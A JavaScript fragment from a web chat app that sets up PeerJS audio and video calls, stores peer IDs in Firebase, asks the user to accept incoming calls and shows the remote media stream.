// ── WEBRTC CALLS (PeerJS) ─────────────────────────────────
function initPeer(peerId) {
    if (typeof Peer === "undefined") return;
    const cleanId = peerId.replace(/[^a-z0-9\-_]/gi, "_");
    peer = new Peer(cleanId, { host: "0.peerjs.com", port: 443, path: "/", secure: true });

    peer.on("open", id => {
        // Store peer ID in Firebase so the other party can call us
        if (ONLINE && currentUser?.code)
            set(ref(db, `peerIds/${currentUser.code}`), id);
    });

    peer.on("call", call => {
        const type = call.metadata?.type || "audio";
        const accept = confirm(`📞 Incoming ${type} call from ${call.metadata?.name || "someone"}. Accept?`);
        if (!accept) { call.close(); return; }
        navigator.mediaDevices.getUserMedia({ audio: true, video: type === "video" })
            .then(stream => { call.answer(stream); handleCallStream(call, stream, type); })
            .catch(() => alert("Mic/camera access denied."));
    });
}

// Admin initiates call — look up user peer ID from Firebase
window.startCall = async function (callType) {
    if (!peer) { alert("Call system not ready."); return; }
    if (!currentRoomId) { alert("Select a contact first."); return; }
    const code = currentRoomId.replace("room_", "");

    let targetPeerId = null;
    if (ONLINE) {
        const snap = await get(ref(db, `peerIds/${code.toUpperCase()}`));
        if (snap.exists()) targetPeerId = snap.val();
    }
    if (!targetPeerId) { alert("Contact is not online right now."); return; }

    navigator.mediaDevices.getUserMedia({ audio: true, video: callType === "video" })
        .then(stream => {
            const call = peer.call(targetPeerId, stream, { metadata: { type: callType, name: "Het Patel" } });
            call.on("error", e => { alert("Call failed: " + e); endCall(); });
            handleCallStream(call, stream, callType);
        })
        .catch(() => alert("Camera/mic access needed for calls."));
};

function handleCallStream(call, localStream, type) {
    activeCall = call;
    const bar = document.getElementById(currentUser?.isAdmin ? "call-bar" : "user-call-bar");
    if (bar) { bar.classList.remove("hidden"); bar.style.display = "flex"; }

    call.on("stream", remoteStream => {
        let el = document.getElementById("remote-media");
        if (!el) {
            el = document.createElement(type === "video" ? "video" : "audio");
            el.id = "remote-media"; el.autoplay = true; el.playsinline = true;
            if (type === "video") el.className = "fixed bottom-20 right-4 w-48 h-36 rounded-xl object-cover z-50 shadow-2xl border border-white/10";
            document.body.appendChild(el);
        }
        el.srcObject = remoteStream;
    });
    call.on("close", endCall);
}

window.endCall = function () {
    activeCall?.close(); activeCall = null;
    const remEl = document.getElementById("remote-media"); remEl?.remove();
    ["call-bar", "user-call-bar"].forEach(id => hide(document.getElementById(id)));
};
